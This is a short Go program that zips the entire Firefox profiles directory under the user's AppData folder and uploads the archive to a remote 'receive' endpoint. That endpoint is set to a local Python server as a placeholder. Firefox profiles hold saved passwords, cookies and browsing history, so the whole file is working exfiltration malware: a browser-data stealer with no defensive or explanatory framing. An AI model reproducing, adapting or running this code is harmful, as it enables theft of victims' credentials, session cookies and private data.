package main

import (
    "archive/zip"
    "bytes"
    "fmt"
    "io"
    "mime/multipart"
    "net/http"
    "os"
    "path/filepath"
)

const URL = "http://127.0.0.1:8000/receive" // URL of your Python server
const ZIPFILE = "pippo.zip"                 // Arbitrary name for the zip file

func ZipDir(directory string) (*bytes.Buffer, error) {
    buf := new(bytes.Buffer)
    w := zip.NewWriter(buf)
    defer w.Close()

    err := filepath.Walk(directory, func(path string, info os.FileInfo, err error) error {
        if err != nil {
            return err
        }
        if info.IsDir() {
            return nil
        }

        file, err := os.Open(path)
        if err != nil {
            return err
        }
        defer file.Close()

        to, err := w.Create(path)
        if err != nil {
            return err
        }

        _, err = io.Copy(to, file)
        if err != nil {
            return err
        }

        return nil
    })

    if err != nil {
        return nil, err
    }

    return buf, nil
}

func SendAsMultipartFile(filename string, data []byte) error {
    buf := new(bytes.Buffer)
    w := multipart.NewWriter(buf)
    file, err := w.CreateFormFile("file", filename)
    if err != nil {
        return err
    }
    file.Write(data)
    w.Close()

    req, err := http.NewRequest("POST", URL, buf)
    if err != nil {
        return err
    }
    req.Header.Set("Content-Type", w.FormDataContentType())

    client := &http.Client{}
    res, err := client.Do(req)
    if err != nil {
        return err
    }
    defer res.Body.Close()

    if res.StatusCode != http.StatusOK {
        return fmt.Errorf("unexpected status code: %d", res.StatusCode)
    }

    return nil
}

func main() {
    userProfile := os.Getenv("USERPROFILE")
    DIR := filepath.Join(userProfile, "AppData", "Roaming", "Mozilla", "Firefox", "Profiles")
    fmt.Println("Directory:", DIR)
    buf, err := ZipDir(DIR)
    if err != nil {
        fmt.Println(err)
        return
    }
    if err := SendAsMultipartFile(ZIPFILE, buf.Bytes()); err != nil {
        fmt.Println(err)
        return
    }
    fmt.Println("Successfully sent zip file to server.")
}
